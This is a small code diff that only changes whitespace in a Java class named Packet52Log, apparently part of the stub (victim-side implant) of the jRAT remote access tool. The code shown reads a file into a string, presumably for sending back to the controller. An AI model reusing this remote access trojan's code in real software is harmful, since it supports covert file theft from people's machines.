@@ -8,8 +8,6 @@ import java.io.InputStreamReader;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.utils.Utils;
 
-
-
 public class Packet52Log extends AbstractIncomingPacket {
 
 	@Override
@@ -19,9 +17,9 @@ public class Packet52Log extends AbstractIncomingPacket {
 		FileInputStream in = new FileInputStream(file);
 		BufferedReader reader = new BufferedReader(new InputStreamReader(in));
 		String log = "";
-		
+
 		String line;
-		
+
 		while ((line = reader.readLine()) != null) {
 			log += line + "\n";
 		}
